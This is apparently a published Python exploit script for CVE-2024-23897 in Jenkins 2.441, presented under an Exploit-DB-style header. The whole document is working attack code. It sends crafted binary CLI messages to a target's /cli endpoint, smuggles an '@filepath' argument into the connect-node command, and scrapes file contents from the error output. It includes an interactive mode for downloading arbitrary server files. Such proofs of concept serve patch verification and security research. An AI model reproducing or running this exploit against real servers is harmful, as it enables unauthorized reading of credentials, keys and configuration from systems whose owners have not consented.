# Exploit Title: Jenkins 2.441 - Local File Inclusion
# Date: 14/04/2024
# Exploit Author: Matisse Beckandt (Backendt)
# Vendor Homepage: https://www.jenkins.io/
# Software Link: https://github.com/jenkinsci/jenkins/archive/refs/tags/jenkins-2.441.zip
# Version: 2.441
# Tested on: Debian 12 (Bookworm)
# CVE: CVE-2024-23897

from argparse import ArgumentParser
from requests import Session, post, exceptions
from threading import Thread
from uuid import uuid4
from time import sleep
from re import findall

class Exploit(Thread):
  def __init__(self, url: str, identifier: str):
    Thread.__init__(self)
    self.daemon = True
    self.url = url
    self.params = {"remoting": "false"}
    self.identifier = identifier
    self.stop_thread = False
    self.listen = False

  def run(self):
    while not self.stop_thread:
      if self.listen:
        self.listen_and_print()

  def stop(self):
    self.stop_thread = True

  def receive_next_message(self):
    self.listen = True

  def wait_for_message(self):
    while self.listen:
      sleep(0.5)

  def print_formatted_output(self, output: str):
    if "ERROR: No such file" in output:
      print("File not found.")
    elif "ERROR: Failed to parse" in output:
      print("Could not read file.")

    expression = "No such agent \"(.*)\" exists."
    results = findall(expression, output)
    print("\n".join(results))

  def listen_and_print(self):
    session = Session()
    headers = {"Side": "download", "Session": self.identifier}
    try:
      response = session.post(self.url, params=self.params, headers=headers)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print("Could not connect to target to setup the listener.")
      exit(1)

    self.print_formatted_output(response.text)
    self.listen = False

  def send_file_request(self, filepath: str):
    headers = {"Side": "upload", "Session": self.identifier}
    payload = get_payload(filepath)
    try:
      post(self.url, data=payload, params=self.params, headers=headers, timeout=4)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print("Could not connect to the target to send the request.")
      exit(1)

  def read_file(self, filepath: str):
    self.receive_next_message()
    sleep(0.1)
    self.send_file_request(filepath)
    self.wait_for_message()

def get_payload_message(operation_index: int, text: str) -> bytes:
  text_bytes = bytes(text, "utf-8")
  text_size = len(text_bytes)
  text_message = text_size.to_bytes(2) + text_bytes
  message_size = len(text_message)

  payload = message_size.to_bytes(4) + operation_index.to_bytes(1) + text_message
  return payload

def get_payload(filepath: str) -> bytes:
  arg_operation = 0
  start_operation = 3

  command = get_payload_message(arg_operation, "connect-node")
  poisoned_argument = get_payload_message(arg_operation, f"@{filepath}")

  payload = command + poisoned_argument + start_operation.to_bytes(1)
  return payload

def start_interactive_file_read(exploit: Exploit):
  print("Press Ctrl+C to exit")
  while True:
    filepath = input("File to download:\n> ")
    filepath = make_path_absolute(filepath)
    exploit.receive_next_message()

    try:
      exploit.read_file(filepath)
    except exceptions.ReadTimeout:
      print("Payload request timed out.")

def make_path_absolute(filepath: str) -> str:
    if not filepath.startswith('/'):
      return f"/proc/self/cwd/{filepath}"
    return filepath

def format_target_url(url: str) -> str:
  if url.endswith('/'):
    url = url[:-1]
  return f"{url}/cli"

def get_arguments():
  parser = ArgumentParser(description="Local File Inclusion exploit for CVE-2024-23897")
  parser.add_argument("-u", "--url", required=True, help="The url of the vulnerable Jenkins service. Ex: http://helloworld.com/")
  parser.add_argument("-p", "--path", help="The absolute path of the file to download")
  return parser.parse_args()

def main():
  args = get_arguments()
  url = format_target_url(args.url)
  filepath = args.path
  identifier = str(uuid4())

  exploit = Exploit(url, identifier)
  exploit.start()

  if filepath:
    filepath = make_path_absolute(filepath)
    exploit.read_file(filepath)
    exploit.stop()
    return

  try:
    start_interactive_file_read(exploit)
  except KeyboardInterrupt:
    pass
  print("\nQuitting")
  exploit.stop()

if __name__ == "__main__":
  main()